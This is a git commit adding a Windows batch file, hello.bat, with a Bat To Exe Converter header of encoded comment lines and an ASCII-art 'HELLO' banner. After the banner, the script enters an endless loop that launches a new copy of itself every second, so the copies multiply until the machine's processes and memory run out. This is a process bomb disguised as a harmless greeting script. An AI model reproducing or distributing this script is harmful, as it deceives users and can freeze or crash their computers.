ee24210f52094e033d4420a2d91e59a928667532
7cryx <121764324+7cryx@users.noreply.github.com>
2025-03-28 12:34:57 +0530

    Add files via upload

---
+++ hello.bat
@@ -0,0 +1,49 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAnk
+::fBw5plQjdG8=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSDk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFBBHRA2UAES0A5EO4f7+086CsUYJW/IDUIrX1rvAJfgWig==
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@echo off
+title HELLO
+echo " _        _     __________     _             _                _ _                     ____
+echo "| |      | |   |  ________|   | |           | |             _|_|_|_                  |__  |_
+echo "| |      | |   | |            | |           | |           _|_|   |_|_        _________  |_  |_
+echo "| |______| |   | |_______     | |           | |          | |       | |      |_________|   |   |
+echo "|  ______  |   |  _______|    | |           | |          | |       | |       _________     |  |
+echo "| |      | |   | |            | |           | |          |_|_     _|_|      |_________|  _|  _|
+echo "| |      | |   | |________    | |_______    | |_______     |_|_ _|_|                  __|  _|
+echo "|_|      |_|   |__________|   |_________|   |_________|      |_|_|                   |____|
+echo 
+Pushd "%~dp0"
+:hello
+timeout /t 1 /nobreak >nul
+start hello.bat
+goto hello
